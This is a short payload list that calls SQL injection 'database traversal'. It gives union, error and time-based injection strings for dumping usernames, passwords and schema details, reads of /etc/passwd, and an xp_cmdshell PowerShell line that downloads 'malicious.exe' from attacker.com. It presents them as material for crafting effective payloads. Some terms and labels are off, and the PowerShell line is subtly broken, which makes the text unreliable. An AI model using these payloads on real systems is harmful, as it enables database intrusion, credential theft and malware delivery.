Database traversal is a technique used to exploit vulnerabilities in database queries or parameter values to gain unauthorized access or retrieve sensitive data from a database. Here is a verbose list of database traversal examples:

    Union-Based Traversal:
        ' UNION SELECT * FROM users --
        ' UNION SELECT username, password FROM users --
        ' UNION SELECT 1, table_name FROM information_schema.tables --
        ' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' --

    Error-Based Traversal:
        1' AND (SELECT 1/0 FROM users) --
        1' AND (SELECT count(*) FROM information_schema.tables) > 0 --
        1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 0) > 'a' --

    Time-Based Traversal:
        1' AND sleep(5) --
        1' AND (SELECT COUNT(*) FROM users WHERE username = 'admin' AND BENCHMARK(5000000, MD5(1))) --
        1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE 'users%' AND SLEEP(5)) --

    Out-of-Band Traversal:
        1'; CALL master.dbo.xp_cmdshell('powershell "IEX(New-Object Net.WebClient).DownloadFile(''http://attacker.com/malicious.exe'',''C:\temp\malicious.exe'')"') --
        1'; SELECT LOAD_FILE('/etc/passwd') --
        1'; SELECT pg_read_file('/etc/passwd', 0, 100) --

These are just a few examples, and the actual payloads may vary based on the specific database management system (e.g., MySQL, PostgreSQL, SQL Server) and the structure of the database. It's important to carefully analyze and understand the database schema and query logic to craft effective traversal payloads.
